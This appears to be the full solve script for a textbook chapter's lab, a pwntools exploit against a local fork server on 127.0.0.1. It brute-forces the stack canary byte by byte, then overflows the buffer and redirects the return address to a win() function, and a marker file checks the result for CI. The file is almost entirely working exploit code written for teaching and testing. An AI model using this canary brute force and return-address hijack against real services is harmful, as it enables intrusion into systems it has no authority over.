#!/usr/bin/env python3
"""ch11-canary/fork-brute/solve.py -- full solve for the fork-server canary
brute. The chapter's lst-brute excerpt is exactly the brute_canary() loop
below; the surrounding code is the follow-up connection that overwrites the
saved return address underneath the reproduced canary and hands control to
win() (which writes ``pwn.marker`` for the CI test).
"""
from pwn import *

import os
import sys
import time

HOST, PORT = '127.0.0.1', 4011
BUF_LEN    = 64                                # from Ghidra / source
OFFSET     = BUF_LEN + 8                       # buf + struct pad = 72 (canary sits here)
CANARY_LEN = 8

HERE = os.path.dirname(os.path.abspath(__file__))
BIN  = os.path.join(HERE, "server")

context.log_level = 'warning'


# ---------------------------------------------------------------------------
# lst-brute (book verbatim -- the chapter's excerpt is this loop, unchanged)
# ---------------------------------------------------------------------------
def try_byte(known: bytes, candidate: int) -> bool:
    """Return True iff appending `candidate` keeps the canary consistent."""
    io = remote(HOST, PORT)
    guess   = known + bytes([candidate])            # one byte past the known prefix
    payload = b'A' * OFFSET + guess                 # write exactly up to this byte
    io.send(payload)
    try:
        reply = io.recvuntil(b'ok\n', timeout=1.0)  # oracle: server acks
        io.close()
        return b'ok' in reply
    except EOFError:
        io.close()
        return False


def brute_canary() -> bytes:
    known = b''
    for i in range(CANARY_LEN):
        if i == 0:
            known += b'\x00'                        # low byte is always 0
            log.info('byte 0 fixed to 0x00 (glibc invariant)')
            continue
        for cand in range(256):
            if try_byte(known, cand):
                log.success(f'byte {i} = {cand:#04x}')
                known += bytes([cand])
                break
        else:
            log.failure(f'byte {i} not found; check offset / oracle')
            sys.exit(1)
    return known


# ---------------------------------------------------------------------------
# Follow-up: reproduce the canary and rewrite the return address
# ---------------------------------------------------------------------------
def pwn(canary: bytes) -> bool:
    elf = ELF(BIN, checksec=False)
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret'])[0]

    payload  = b'A' * OFFSET
    payload += canary                               # replay canary verbatim
    payload += b'B' * 8                             # saved rbp
    payload += p64(ret_gadget)                      # 16-byte alignment for win()
    payload += p64(elf.sym['win'])

    io = remote(HOST, PORT)
    io.send(payload)
    try:
        io.recvall(timeout=2)
    except Exception:
        pass
    io.close()

    # give win() a moment to write the marker
    for _ in range(20):
        if os.path.exists(os.path.join(HERE, 'pwn.marker')):
            return True
        time.sleep(0.05)
    return False


def main() -> int:
    # Clean any prior marker before starting
    try:
        os.remove(os.path.join(HERE, 'pwn.marker'))
    except FileNotFoundError:
        pass

    canary = brute_canary()
    log.success(f'canary = {canary.hex()}')

    if pwn(canary):
        print('FORK-BRUTE-OK')
        return 0
    print('FORK-BRUTE-FAIL: marker not written')
    return 1


if __name__ == '__main__':
    sys.exit(main())
